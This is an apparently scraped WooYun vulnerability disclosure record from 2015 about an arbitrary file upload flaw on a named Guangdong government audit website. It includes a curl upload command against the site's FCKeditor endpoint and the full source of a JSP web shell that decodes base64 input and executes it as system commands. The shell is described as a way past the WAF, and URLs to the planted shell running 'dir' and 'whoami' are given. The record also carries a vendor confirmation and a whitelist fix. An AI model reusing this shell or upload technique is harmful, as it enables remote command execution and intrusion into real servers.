{"id": 35290, "wybug_id": "wooyun-2015-0104293", "wybug_title": "广东省某政府网站存在漏洞可入内网", "wybug_corp": "广东省某政府网站", "wybug_author": "路人甲", "wybug_date": "2015-03-30 12:51", "wybug_open_date": "2015-05-15 16:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向公众公开  简要描述： nt authority\\system 详细说明：  出问题站点：广东省审计厅\nhttp://www.gdaudit.gov.cn/\n千言万语汇成一个命令：\ncurl \"http://www.gdaudit.gov.cn/FCKeditor/editor/filemanager/upload/simpleuploader?Type=File\" -F  NewFile=@/tmp/jspx64.jspx\n对方服务器有WAF之类的防护设备，执行系统命令的时候可能被拦截。经过手工base64编码，然后到服务端去debase64即可轻松避开WAF的阻断。附jspx内容：\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"          xmlns=\"http://www.w3.org/1999/xhtml\"          xmlns:c=\"http://java.sun.com/jsp/jstl/core\" version=\"1.2\">    <jsp:directive.page contentType=\"text/html\" pageEncoding=\"gb2312\"/>    <jsp:directive.page import=\"java.io.*\"/>\t<jsp:directive.page import=\"sun.misc.BASE64Decoder\"/>    <html>        <head>            <title>jspx</title>        </head>        <body>            <jsp:scriptlet>               try {\t\tBASE64Decoder decoder = new BASE64Decoder();\t\tString content=request.getParameter(\"tttt\");\t\tString cmd = new String(decoder.decodeBuffer(content));\t\tif (cmd !=null){\t\t\tProcess child = Runtime.getRuntime().exec(cmd);\t\t\tInputStream in = child.getInputStream();\t\t\tint c;\t\t\twhile ((c = in.read()) != -1) {\t\t\tout.print((char)c);\t\t\t}\t\t\tin.close();\t\t\ttry {\t\t\tchild.waitFor();\t\t\t} catch (InterruptedException e) {\t\t\te.printStackTrace();\t\t}\t\t}\t\t} catch (IOException e) {\t\tSystem.err.println(e);\t\t}            </jsp:scriptlet>        </body>    </html></jsp:root>\n\n\n存在waf\n\n可绕过\nhttp://www.gdaudit.gov.cn/userfiles/File/jspx64(1).jspx?tttt=Y21kIC9jIGRpciBkOlw%3D\ndebase64(\"Y21kIC9jIGRpciBkOlw=\")=\"cmd /c dir d:\\\"   漏洞证明：  一句话jspx：\nhttp://www.gdaudit.gov.cn/userfiles/File/jspx64(1).jspx?tttt=Y21kIC9jIGRpciBkOlw%3D\nTomcat权限：\nhttp://www.gdaudit.gov.cn/userfiles/File/jspx64(1).jspx?tttt=d2hvYW1p\n\n\n处于内网中\n\n   修复方案：  fck上传文件后缀进行白名单验证   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-03-31 16:13 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：13正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}